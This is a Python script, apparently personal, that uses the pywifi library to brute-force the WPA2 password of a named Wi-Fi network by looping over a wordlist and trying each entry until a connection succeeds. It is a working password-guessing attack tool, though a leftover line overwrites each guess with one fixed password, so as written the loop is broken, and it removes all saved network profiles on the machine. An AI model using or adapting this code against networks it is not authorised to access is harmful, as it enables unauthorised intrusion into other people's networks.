import time
import pywifi
from pywifi import const

def connect(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # Disconnect any existing connections
    iface.disconnect()
    time.sleep(1)
    if iface.status() == const.IFACE_DISCONNECTED:
        print("Disconnected from current network")
    else:
        print("Failed to disconnect from current network")
        return False

    # Set up the Wi-Fi profile
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.key = password
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    # Remove all current profiles and add the new profile
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    # Connect to the network
    iface.connect(tmp_profile)
    time.sleep(5)  # Wait a bit for the connection to establish

    if iface.status() == const.IFACE_CONNECTED:
        print(f"Successfully connected to {ssid}")
        return True
    else:
        # print(f"Failed to connect to {ssid}")
        return False

num = 1

if __name__ == "__main__":
    for worlist in open("f:/Jarvis_mk4/other/airtel_wifi_wordlist(min-8chars).txt" , "r").readlines():
        # naam = "Airtel_gopa_9909"
        naam = "vivo_1904"
        passwd = worlist
        passwd = "ENGLISH00/20"
        checker = connect(ssid=naam, password=passwd)
        print(num)
        num += 1
        if checker == True:
            print(worlist)
            exit()
        else:
            pass
